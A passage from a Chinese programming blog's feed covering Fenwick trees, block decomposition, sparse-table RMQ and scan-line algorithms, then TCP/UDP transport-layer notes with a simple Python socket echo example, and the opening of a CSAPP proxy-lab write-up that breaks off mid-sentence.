class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x&amp;-x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　尽管只有短短一行代码，理解起来还是有一定难度的。这个函数的作用是取得二进制下x的最小的1所在的位置对应的值。这样说起来有点绕口。举个例子，x=10100100<sub>(2)</sub>，这个时候x最右的一个1在第三位，对应的值为100<sub>(2)</sub>。我们可以验证一下，-x = 01011100<sub>(2)</sub>，x&amp;-x = 100。具体证明此处省略。<br>　　在理解了lowbit函数后，我们就可以观察上面的图，我们可以看出，每一个点保存的其实就是(x-lowbit(x),x]区间的数字的和。</p><h3 id="query-1"><a href="#query-1" class="headerlink" title="query"></a>query</h3><p>　　理解好了树状数组的结构后，我们来看一下应该怎样对区间进行求和。首先，我们给定x，我们考虑如何求[1,x]区间上所有数字的和。代码很简单，见下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> lowbit(x) (x&amp;-x)</span></span><br><span class="line"><span class="comment">// sum[i]为树状数组</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(x) &#123;</span><br><span class="line">    ans += sum[x];</span><br><span class="line">    x -= lowbit(x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　为什么上面的代码能起作用呢？如果当前我们要查找[1,7]的区间和，那么，由上面的函数，我们可以得到ans = sum[7] + sum[6] + sum[4]。不难看出，对于[1,x]的区间求和的问题，我们可以划分为[1,x-lowbit(x)]和[x-lowbit(x)+1,x]的和两个子问题，而由树状数组的结构，我们有[x-lowbit(x)+1,x]的区间和为sum(x)，这个时候，整个问题就变成只需要求[1, x-lowbit(x)]的值的问题了。这样不断递归下去，最终，当x是2的整数次幂的时候，sum[x]表示的恰好就是[1,x]的值，函数退出，我们成功地求出了前缀和！<br>　　当我们能求出前缀和的时候，剩下的问题就很简单了。当我们需要求[l,r]的值的时候，我们只需要求query(r)-query(l-1)的值即可。</p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>　　我们先来考虑更新一个点的情况。要更新一个点，我们需要同时更新其“父”节点，对于树状数组而言，该节点对应的下标为x+lowbit(x)。由此，我们可以得到以下的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// n 为数组元素的个数</span></span><br><span class="line"><span class="comment">// 注意，对于这种结构的树状数组来说，把点d从a变成b的时候，我们的更新是相当于加了一个差值，即update(d, b-a)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (x &lt;= n) &#123;</span><br><span class="line">    sum[x] += v;</span><br><span class="line">    x += lowbit(x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　那么，接下来我们考虑该如何进行区间的更新呢？<br>　　…<br>　　…<br><img src="/2019/05/14/data-structure1/wenhao.jpeg" alt="?"><br>　　惊了！我们发现，按照我们目前的思路，除了单个点逐步暴力地更新之外，我们发现竟然没有别的什么好办法。那怎么办？这个博客就不写了吗？<br>　　不，我还是拒绝！<br>　　其实，想要进行区间的更新还是有办法的，但是我们的数组存放的“东西”得改一改了(见codevs中<a href="http://codevs.cn/problem/1081/" target="_blank" rel="noopener">线段树练习2</a>)。</p><blockquote><p>这里简单的讲一下这道题的意思，就是n个数，m个操作，其中，共有两种操作类型，其一是进行区间的更新(加上某个值)，其二是进行单点的查询。在这样的一个背景下，我们可以使用线段树来完成这个要求。</p></blockquote><p>　　具体来说，对于原先的数组a[N]，我们新建一个数组sum[N]，并且，sum[N]是一个树状数组，保存的是相对与初始值的变化量，初始为空。接下来，更新的操作比较神奇。假设我们要在区间[l,r]上，每个数都加上n。我们知道，下标为x的数字，当且仅当l&lt;=x&lt;=r时，即在区间内时，这个数字需要加上n。这个时候，我们就可以在下标为l的地方加上标记n，在下标为r+1的地方打上标记-n，这样，在单点查询下标为x的位置的值的时候，我们的问题就可以转化为一个区间求值的问题了。如果还是不太理解，请看下图：<br><img src="/2019/05/14/data-structure1/binary_indexed_example.jpg" alt="binary_indexed_example"></p><h3 id="advantage-amp-limitation"><a href="#advantage-amp-limitation" class="headerlink" title="advantage &amp; limitation"></a>advantage &amp; limitation</h3><p>　　由上面的介绍，我们其实可以看得出来，树状数组虽然理解起来稍微困难一些，但是代码量是很小的，而且也很难出现一些隐蔽的bug，这对与经常写出bug的程序猿(比如笔者)来说，还是很友好的。并且，时间上，树状数组进行区间查询和单点修改的操作的复杂度为O(logn)，且常数极小，因此在树状数组适用的情景下，其效率是线段树的好几倍(线段树由于存在函数的递归，以及lazy tag的pushdown操作，常数是很大的)。空间上，树状数组通常不需要额外的存储空间，其空间复杂度为O(n)，而线段树通常需要2n~4n的空间，这使得线段树显得过于“笨重”。<br>　　但是，树状数组的特性也决定了它具有很大的局限性——由上面我们知道，树状数组比较适合用来做区间的查询和单点的更新数量较多的操作，但是无法进行区间的修改。尽管后面的版本我们通过记录区间边界使得树状数组可以进行区间的修改，但同时，无法进行区间的查询，这是相对的。因此，尽管树状数组确实很好用，但应用范围比较狭窄。可以说，树状数组可以实现的东西，线段树都可以实现，然而线段树可以实现的东西，很多情况下树状数组却实现不了。当然，在能用树状数组实现的情形下，还是推荐用树状数组好。<br>　　另外，关于树状数组和线段树的使用情形，看过一句话说得挺精辟的。在离散数学的观点下，线段树适用于含幺半群(即满足结合律，且有单位元)，而树状数组仅适用于交换群(必须满足结合律，交换律，且含有单位元，以及每个元素均存在逆元)。故树状数组适用范围更小一些。</p><h2 id="block-algorithm"><a href="#block-algorithm" class="headerlink" title="block(?) algorithm"></a>block(?) algorithm</h2><p>　　也许上面提供的两种区间的结构化查询你都不够满意，现在，还有一种十分暴力的写法，它的名字叫做”分块”。这种做法就是完全暴力的进行处理，它能处理基本上所有线段树能处理的问题，并且，对于线段树处理不了的某些问题，它竟然也能够处理！那么，我们就来看一看分块是什么吧。<br>　　现在，我们来考虑下这个问题(codevs的<a href="http://codevs.cn/problem/5037/" target="_blank" rel="noopener">线段树练习4加强版</a>)：</p><blockquote><p>给一个序列，含有n个元素(1&lt;=n&lt;=200000)，要求实现m个操作，共两种类型，第一种是区间每一个数都加上n，第二种是查询区间内有多少个数是k的倍数。其中，1&lt;=k&lt;=200000，1&lt;=m&lt;=200000</p></blockquote><p>　　看到k的取值范围这么大，瞬间慌了，这不就是不想让我用线段树吗？每个节点保存20w个数字，怎么可能？因此，忍无可忍的情况下，我们决定暴力做了。<br>　　首先，很明显如果我们要直接便利的话，复杂度还是太高了，最坏情况下达到O(mn)，这不行。那么，我们能否参考一下使用线段树的思路呢？具体来说，我们也可以考虑一下将区间分成一个个的小块，然后，维护每一个块上值为1~200000的倍数的数字的数量，这样就可以解决了！<br>　　以n=200000，1&lt;=k&lt;=200000为例，我们取每一个块的大小为500，那么总共就有400个块，每一个块上维护的话需要400*200000大小的数组。这已经很极限了。当我们需要将区间[l,r]值增加n的时候，按照一下步骤：</p><ol><li>l和r在同一个块里面的时候，则r-l&lt;500，我们直接暴力for循环增加即可。</li><li>当l和r不在同一个块的时候，不妨假设l所在的块为x1&lt;=l&lt;=x2，r所在的块的范围为x3&lt;=r&lt;=x4，则我们需要for循环更新位于[l,x2]和[x3,r]的所有点的值，并且，将位于x2和x3之间的所有块全部加上标记n即可。这样的话，最坏情况下，复杂度也是近似于O(sqrt(n))。</li></ol><p>　　同样的，在进行区间内查询的时候，假设查询[l,r]区间内k的倍数的个数，按照以下步骤：</p><ol><li>l和r在同一个块里面，直接暴力求解</li><li>l和r不在同一个块里面，则同样假设l所在的块为x1&lt;=l&lt;=x2，r所在的块的范围为x3&lt;=r&lt;=x4。则我们只需要for循环遍历位于[l,x2]和[x3,r]的所有点，看下该值加上当前块的标记值结果是否是k的倍数即可复杂度为O(sqrt(n))。对于位于[x2,x3]内所有的块，假设当前的块标记值为c，则我们只需要查看数组中(k-c)的值即可，复杂度同样为O(sqrt(n))。</li></ol><p>　　本质上，这样的分块算法其实相当于一颗高度为3的树，其中，每个非叶子节点的孩子的个数近似为sqrt(n)个。整个问题而言，最后的总复杂度为O(m*sqrt(n))。<br>　　当然，这道题本身应该有比较优秀的做法，这里只是提一下分块这样的一种思想，在处理一些十分棘手的问题，并且实在想不出什么好的问题的时候，不妨试一试吧。这里顺便说一句题外话，如果是静态的序列，想多次查找某个值是否是k的倍数的话，有一个叫做莫队算法的神奇的东西(好像就是一位叫莫涛的选手发明的)，本质上也是用到了分块的思想。</p><h2 id="Range-minimum-query-RMQ"><a href="#Range-minimum-query-RMQ" class="headerlink" title="Range minimum query (RMQ)"></a>Range minimum query (RMQ)</h2><p>　　前面我们提到，树状数组无法实现对于区间的求最值问题，是因为max和min运算不存在逆元。现在，如果我们想求区间的最大值最小值，但又觉得线段树太慢，有没有什么能像树状数组一样快的东西呢？结论是有的！(当然，这种算法不适用于动态更新的序列</p><h3 id="detail"><a href="#detail" class="headerlink" title="detail"></a>detail</h3><p>　　ST-RMQ算法本质上应该算是动态规划类，它的优秀之处在于，对于一个给定的序列，它只需要O(nlogn)的复杂度进行初始化，此后，能以O(1)的复杂度解决区间最值的求解问题。在一个2^n长度的数组中，对于一个坐标为x的点，我们可以保存以其为起点，且区间长度为2<sup>k</sup>的区间的最值。在动态规划的思想中，我们使用F[Bit][Pos]来表示起点位于Pos，且长度为2<sup>Bit</sup>的区间的最值。这个时候，求解的状态转移方程如下：</p><blockquote><p>F[bit][p] = max(F[bit-1][p], F[bit-1][p+(1&lt;&lt;(bit-1))]);</p></blockquote><p>　　即对于长度为b = 2<sup>bit</sup>的区间来说，该区间的最大值等于两个子区间中最大值更大的那一个。当然，也许你会问，如果仅仅能得到长度为2的幂次的区间的最值，那有什么用？通常情况下，我们遇到的区间的大小都不会是2的幂次。这里有一个比较巧妙的操作。令len是小于等于区间长度的最大的2的幂次，则整个区间的最大值为max(F[bit][l],F[bit][r-len+1])<br>　　核心代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化操作</span></span><br><span class="line"><span class="comment">// max_bit 表示小于等于区间长度的最大的2的幂，下面的bit同理</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= max_bit; i++)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (j + (<span class="number">1</span>&lt;&lt;i) - <span class="number">1</span> &gt; n) <span class="keyword">break</span>; <span class="comment">// 超过区间的右侧时退出</span></span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">1</span>&lt;&lt;(i<span class="number">-1</span>);</span><br><span class="line">    F[i][j] = max(F[i<span class="number">-1</span>][j], F[i<span class="number">-1</span>][j+len]);  <span class="comment">// 状态转移方程</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"F[%d][%d]=%d\n"</span>, i, j, F[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取区间[l,r]上的最大值</span></span><br><span class="line">bit = getLen(r-l+<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, max(F[bit][l], F[bit][r-(<span class="number">1</span>&lt;&lt;bit)+<span class="number">1</span>]))</span><br></pre></td></tr></table></figure></p><h2 id="application-of-setment-segment-tree"><a href="#application-of-setment-segment-tree" class="headerlink" title="application of setment segment tree"></a>application of setment segment tree</h2><p>　　前面我们一开始谈到了，线段树是很厉害的，很多事情都可以做。然而，后面我们又枚举了一大堆在比较特殊的情况下，效率比线段树更优的结构，这不是明显打脸吗？现在，我们来看一下线段树究竟可以干一些什么其他的一些结构做不了的事情吧。</p><h3 id="discretization"><a href="#discretization" class="headerlink" title="discretization"></a>discretization</h3><p>　　为了讲接下来的一个例子，我们需要先提到一个概念——离散化。这是一个很神奇的词汇，它可以将一些看似十分困难的题目转化为一些简单的情形。尽管举的例子不太恰当，但我们还是来看一下下面的一种情形吧。<br>　　通常情况下，我们建线段树的时候是以数组的下标为叶子节点建立的，比如数组有n个元素，则线段树的叶子节点数量为n。假设我们现在要以值的大小为节点建一个线段树，比如值域为[1,200000]，则线段树有20w个叶子节点，但是，如果值域变为了[1,20000000]，然后元素的个数仅有10000个，这个时候，我们总不可能建一个叶子节点数为20000000的线段树吧。这个时候，我们就需要用到离散化的思想了。<br>　　离散化思想的本质是，将一个无限大小(或特别大)的空间映射到一个较小的空间。比如下面的函数就类似于一个离散化的过程：<br><img src="/2019/05/14/data-structure1/fx.JPG" alt="fx"></p><p>　　再回来考虑我们前面建立线段树的过程，由于只有10000个节点，而值域为[1,20000000]，我们知道各个节点的值的分布是十分“松散”的。这个时候我们就可以使用离散化，具体步骤是将10000个节点按照大小排序，假设排序后的数组为a0,a1…an，这个时候我们取一个映射：a0-&gt;1,a2-&gt;2…an-&gt;n，这样的话，我们就成功地将一个值域为[1,20000000]的离散区域映射到一个[1,10000]的分布较为紧密的区域当中了，这就是离散化。</p><h3 id="scan-line-algorithm"><a href="#scan-line-algorithm" class="headerlink" title="scan line algorithm"></a>scan line algorithm</h3><p>　　这里要介绍的，就是大名鼎鼎的扫描线算法……..的简单版。这就是一个很典型的线段树的应用问题。<br>　　由于这个笔记的篇幅有点长，这里就不再贴代码了。主要讲一讲相关的思路。为了引入扫描线算法，我们先来看下扫描线算法的一道裸题。</p><blockquote><p>给定一个平面上的n个矩形，求n个矩形的并覆盖到的面积的大小</p></blockquote><p>　　扫描线算法的核心思想在于“扫描”两字，即用一条“扫描线”遍历一整个平面区域。这里，我们假设扫描线与x轴垂直。由于x是递增的，这个时候我们将每一个矩形的两个y轴坐标扔进数组中，进行排序并离散化，映射到一个值域为2n的数组(每一个矩形有两个y坐标)当中，得到2n-1条边，经过去重后，以各条边为叶子节点建立线段树，维护区间的覆盖问题。(其实，关于这里y轴的维护具体实现办法有很多种，比如也可以以每一个y坐标为叶子结点，但实现起来很麻烦，最后还是归结到边的覆盖问题)<br>　　接下来，具体的做法是：</p><ol><li>将扫描线从最左侧开始扫描，在第一次与矩形的边界重合的时候停下。</li><li>如果遇到的是左边界，则说明该区间被覆盖。如果遇到的是右边界，则说明该区间不再被对应的某个矩形覆盖。并且更新线段树。</li><li>继续往右扫描，直到遇到边界，假设此时前进了deltaX，则当前答案加上deltaX乘上线段树中区间覆盖的面积，再进入2。直到到达最后一条边，结束循环。</li></ol><p>　　如果还是不太理解，建议结合下面的图看一下。其中，红色为扫描线，深蓝色表示该边当前已覆盖，浅蓝色表示该边已覆盖。<br><img src="/2019/05/14/data-structure1/scan_line1.JPG" width="40%"><br><img src="/2019/05/14/data-structure1/scan_line23.png" width="80%"><br><img src="/2019/05/14/data-structure1/scan_line45.png" width="80%"></p><p>　　这就是实现一个扫描线算法的简单思路，当然，具体实现过程中会有许许多多的小细节，各种边界问题什么的需要处理，难度还是比较大的。这里就不再进行叙述了。(毕竟这是数据结构的笔记，这里提到这个算法主要还是想提一下线段树的应用）</p><h2 id="epilogue"><a href="#epilogue" class="headerlink" title="epilogue"></a>epilogue</h2><p>　　到这里，我们的数据结构大杂烩系列的第一篇文章就结束了。这里总结一下这篇文章讲的内容吧。首先，由一个简单的问题，我们引入了线段树，并且，讲到了线段树是如何构建的，并且，它是如何实现单点/区间的更新和单点/区间的求和(乘积)，以及线段树的lazy tag思想。在此上拓展开来，我们又简单地提到了树状数组及其应用，这是一种效率很高但同时受限又很大的数据结构，并且我们比较了线段树和树状数组的特点。接下来，我们又讲到了分块算法，在不得已的情况下，我们可能只能采用分块来对区间进行维护，这是一种“暴力”解法的优化版本。接下来，从树状数组的弊端，我们又讲到了在线RMQ算法，这是一种用于多次求解一个固定序列的区间最值的算法，利用到了动态规划的思想。最后，再次回归到了主线，讲线段树的应用问题——扫描线算法，文章也到此结束。</p><p>　　由于是刚开始这个系列，感觉写起来还是很乱的，基本上是想到什么写什么，并且，详略上可能也存在一些小问题。这篇文章总共用了一天多的时间，大概是从早上十点多写到晚上十点多吧，第二天也花了好几个小时做一点修改。东西挺多，并且个人感觉也已经挺全面了，不过很多东西仅仅简单提及。当然，本身就不可能做到全面，但还是希望能继续加油吧。</p><p>　　预告——下一期应该还是会写和树相关的一些结构，敬请期待吧。</p>]]></content>
      
      
      <categories>
          
          <category> Data Structure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure </tag>
            
            <tag> segment tree </tag>
            
            <tag> binary indexed tree </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Network——Transport Layer</title>
      <link href="/2019/03/27/Network%E2%80%94%E2%80%94Transport-layer/"/>
      <url>/2019/03/27/Network%E2%80%94%E2%80%94Transport-layer/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这篇系列主要是Computer Networking A Top-Down Approach的一些笔记和心得之类的东西。不过不知到能不能坚持下去。这篇文章主要是运输层相关的一些知识点的笔记。希望能加深自己对网络这块的理解。在经典的五层协议模型中，运输层位于应用层和网络层中间，为应用程序的进程之间的通信起着重要的作用。其中，我们重点研究的对象是运输层协议，包括TCP和UDP。</p><h2 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h2><p>　　socket是不同端系统间进程通信的基本单位，是操作系统提供的进程间通讯机制。<br>　　主要方法有(以python为例)：</p><p>　　创建socket：<br>　　socket = socket(AF_INET, SOCK_STREAM)，其中，第一个参数指定了IPv4协议，第二个参数指定了TCP协议。同样的，UDP协议的第二个参数为SOCK_DGRAM。函数返回建立的socket的文件描述符</p><p>　　发送或接收数据：<br>　　socket.recv() (recv方法会阻塞)<br>　　socket.send()</p><p>　　绑定某个端口：<br>　　socket.bind()，若使用UDP协议发送数据，无需绑定端口<br>Client：<br>　　socket.connect() ，与某个socket建立连接，具体建立链接的过程由内核实现(如三次握手)<br>　　状态序列如下：<br><img src="/2019/03/27/Network——Transport-layer/TCP_CLIENT.png" alt="TCP_CLIENT"></p><p>Server：<br>　　socket.listen() ，作用是通知内核，将该socket由主动套接字转化为被动套接字，处于LISTEN状态，此方法不阻塞。同时，内核为每个监听套接字两个队列：<br>　　未完成连接队列：收到了SYN，等待第三次握手，此时，socket的状态为SYN_RCVD。<br>　　已完成连接队列：三次握手过后，已建立连接，此时，socket状态为ESTABLISHED。</p><p>　　socket.accept()：内核从已完成连接的队列中取出socket，并为之分配相应的内存和文件描述符。如果已完成连接的队列为空，则进程被挂起，直到队列非空。<br>　　状态序列如下：<br><img src="/2019/03/27/Network——Transport-layer/TCP_SERVER.png" alt="TCP_SERVER"></p><p>　　Python下使用TCP协议实现简单的客户端和服务端：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// Client</span><br><span class="line">clientSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">clientSocket.connect((serverName, serverPort))</span><br><span class="line">sentence = input(<span class="string">'Input lowercase sentence:'</span>)</span><br><span class="line">clientSocket.send(sentence.encode())</span><br><span class="line">modifiedMessage = clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">'From Server: '</span>, modifiedMessage.decode())</span><br><span class="line">clientSocket.close()</span><br><span class="line"></span><br><span class="line">// Server</span><br><span class="line">serverSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">serverSocket.bind((<span class="string">''</span>, serverPort))</span><br><span class="line">serverSocket.listen(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'The server is ready to receive'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    connectionSocket, addr = serverSocket.accept()</span><br><span class="line">    sentence = connectionSocket.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    capitalizedSentenced = sentence.upper()</span><br><span class="line">    connectionSocket.send(capitalizedSentenced.encode())</span><br><span class="line">    connectionSocket.close()</span><br></pre></td></tr></table></figure></p><h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><p>　　UDP协议和TCP相比，有以下特点：</p><ol><li>UDP是一种无连接协议，端系统间不需要进行连接就可进行通信。因此，UDP时延较小。</li><li>UDP首部仅8字节，远远小于TCP。甚至我们可以在应用层基于UDP设计自己的协议。</li><li>UDP是一种不可靠的协议，它不能保证数据的按序，准确交付。</li></ol><p>　　以下是UDP报文段的结构：<br><img src="/2019/03/27/Network——Transport-layer/UDP.png" alt="UDP"></p><h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><p>　　TCP协议具有以下特点：</p><ol><li>面向连接。端系统的进程在相互通信前，需要先进行三次握手，此后才能正式开始连接。(注意：TCP是一种抽象意义上的连接，其状态仅仅保存在两个对应的端系统当中，中间的网络元素不负责维持该连接状态)</li><li>TCP连接提供的是全双工服务，即两个端系统直接可以直接相互发送信息。</li><li>TCP是可靠的运输协议，能保证数据的准确交付，但不能保证数据的按序，按时交付。</li></ol><p>　　以下是TCP报文段的结构：<br><img src="/2019/03/27/Network——Transport-layer/TCP.png" alt="TCP"></p><h3 id="超时时间的估计"><a href="#超时时间的估计" class="headerlink" title="超时时间的估计"></a>超时时间的估计</h3><p>　　TCP通过超时/重传机制来处理报文段丢失问题。超时长度的限定比较复杂，具体公式如下：<br>　　我们可以通过每一次某报文段从发出到收到并确认所需的时间来估计，并且，直觉告诉我们，越近的一次RTT对和下一次传输的RTT的关系应该是比较紧密的，因此，我们可以选择维护一个EstimatedRTT值，每当获得一个新的SampleRTT时，则对其进行更新，具体规则如下：<br>　　EstimatedRTT = (1 - a) * EstimatedRTT + a * SampleRTT<br>　　这种平均被称为指数加权移动平均，能比较好的估计出下一次RTT，其中a的推荐值为0.125。但是，我们超时间隔肯定是要比这个要大一些的。并且，为了尽量传输时延，同时，也要尽量减少不必要的重传，我们可以借助偏离值来估算。具体公式如下：<br>　　DevRTT = (1 - b) * DevRTT + b * |EstimatedRTT - SampleRTT|<br>　　其中，b的推荐值为0.25。这样，我们可以大概估算出近几个包我们的估计值的误差大小，当这个误差比较大时，说明网络情况不是很好，有时发生了阻塞，这个时候我们应该稍微增大超时间隔，以适应网络的波动。于是，我们最终得到的超时重传时间计算公式如下：<br>　　TimeoutInterval = EstimatedRTT + 4 * DevRTT</p><p>　　另外，在发生超时事件后，TCP将不再为超时的包计算RTT，同时，超时间隔加倍，这就提供了某种形式上的拥塞控制，当网络拥塞发生时，TCP会通过阻塞客户端发包的速率来避免加剧拥塞。<br>　　由于有时候超时周期比较长，一个报文段丢失后，要等很久才能重传，而后面的包由于窗口大小的限制无法发送，这就导致了时间的浪费。当接收到大于3个以上的冗余ACK的时候，说明接收方在该ACK后的一个包缺失，这时就会触发快速重传。</p><h3 id="TCP拥塞控制算法"><a href="#TCP拥塞控制算法" class="headerlink" title="TCP拥塞控制算法"></a>TCP拥塞控制算法</h3><p>　　TCP采用的是拥塞窗口(cwnd)来限制发送方向其连接发送流量的。具体是，在发送方中，未被确认的数据量不会超过cwnd与rwnd中的最小值，即：<br>　　LastByteSent - LastByteAcked &lt;= min {cwnd, rwnd}<br>　　我们知道，TCP仅存在与建立连接的两个端系统上，那么，TCP是如何检测网络拥塞的发生呢？答案是RTT。当发生丢包事件时，即告诉发送方：网络可能发生了拥塞，于是TCP就降低了发送速率。而当收到一个非冗余的ACK时，即告诉了发送方：当前网络通畅，可以继续发送。这是TCP拥塞控制基础。</p><h4 id="慢启动"><a href="#慢启动" class="headerlink" title="慢启动"></a>慢启动</h4><p>　　当一条TCP连接开始时，cwnd通常设置为一个较小值(一个MSS)。当第一个发送的包确认到达时，cwnd的值加上一个MSS，于是，第二次发送了两个报文段，同理，当两个报文段都收到时，第三次发送四个报文段，依次类推。当收到一个超时指示的丢包事件时，TCP发送方将cwnd置为1，并重新开始慢启动过程，并且设置慢启动阈值(ssthresh)记为cwnd/2。此后，若当前的cwnd达到或超过了ssthresh，则不再翻倍，而是进入拥塞避免状态。</p><h4 id="拥塞避免"><a href="#拥塞避免" class="headerlink" title="拥塞避免"></a>拥塞避免</h4><p>　　为了避免拥塞，在该状态下，每个RTT内(不是每次收到ACK)，cwnd的值只增加一个MSS。TCP发送速率呈较稳定的增长状态。当出现超时指示的丢包事件时，同样的ssthresh被更新为cwnd的一半，同时，cwnd被记为一个MSS。当然，如果出现3个冗余ACK指示的丢包事件时，TCP将cwnd的值减半(为了更好的测量结果，cwnd还应该再加上3个MSS)，更新ssthresh的值，同时进入快速恢复状态。</p><h4 id="快速恢复"><a href="#快速恢复" class="headerlink" title="快速恢复"></a>快速恢复</h4><p>　　注意，该状态对TCP来说不是必备的。<br>　　在快速回复中，对于造成进入快速恢复状态的ACK，每当收到一个冗余的该ACK时，cwnd增加一个MSS，最终，当丢失报文段的ACK到达时，TCP在降低cwnd后进入拥塞避免状态。同时，如果出现了超时事件，则进入慢启动状态。<br>　　如下为一个TCP拥塞窗口演化实例：<br><img src="/2019/03/27/Network——Transport-layer/TCPReno.png" alt="TCPReno"></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>　　从上面的拥塞窗口演化图中，我们可以看到，当进入快速回复状态，很明显传输的效率要高一些，当然，我们也发现，如果网络稳定的话，拥塞窗口将呈现一个锯齿状的状态。当今已经有很多算法可以优化这一点，避免了锯齿状的发生。由于慢启动的原因，如果RTT本身就很大的话，这将很大程度上影响用户的体验。对此，有一个解决方式是，部署一个临近用户的前端服务器，在该服务器上利用TCP分岔来分裂TCP连接。即用户向该服务器发送请求，该服务器进行以一个很大的窗口向数据中心维护一条TCP连接，这样的话，响应时间能从大概4RTT降低到RTT。</p><h2 id="Some-Detail"><a href="#Some-Detail" class="headerlink" title="Some Detail"></a>Some Detail</h2><p>　　1. 端口并不是一个物理层面的概念，而是一个抽象概念。它仅仅是协议栈中的两个字节。<br>　　2. TCP和UDP协议可以“监听”同一个端口，两者之间互不干扰。主机在进行多路分解时，是根据{ 协议， 目的端口号， 目的地址， 源端口号， 源地址 }来判断数据是属于哪一个套接字的。<br>　　3. 通常情况下，对于某一个特定的协议而言，一个端口号只能对应一个socket，但有例外。比如在创建socket并调用listen方法后，再fork出子进程，此时由于父子进程之间共享了文件描述符，监听的是同一个socket。在linux3.9(不是很确定)以后，当有连接请求时，内核自动选择唤醒某个进程对请求进行处理。在此之前则会唤醒所有进程，并让其中的某一个处理事件。</p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>csapp-Proxylab</title>
      <link href="/2019/02/22/csapp-Proxylab/"/>
      <url>/2019/02/22/csapp-Proxylab/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第八篇文章。具体题目请见<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>。本文主要讲csapp中的proxy lab的一些问题以及解决办法。如果有什么写得不好的地方，欢迎联系我修改(右下角小图标点开即可对话，可能要稍微等一会)。<br>　　建议在开始实验以前，先把官方的<a href="http://csapp.cs.cmu.edu/3e/proxylab.pdf" target="_blank" rel="noopener">资料</a>看下。不然很可能不知道应该从哪里开始下手。当然，对实验的要求理解清楚之后，做起来还是很简单的(比起上一个实验的话)。 </p><h2 id="malloc-lab"><a href="#malloc-lab" class="headerlink" title="malloc lab"></a>malloc lab</h2><p>　　这个实验，要求我们完成一个网络代理，共分为三个部分：</p><blockquote><p>A. 完成基础的代理的功能<br>B. 在上一步的基础上实现多线程<br>C. 在上一步的基础上添加缓存功能</p></blockquote><p>　　具体实现时，可以在实验文件目录下，使用命令<b> ./driver.sh 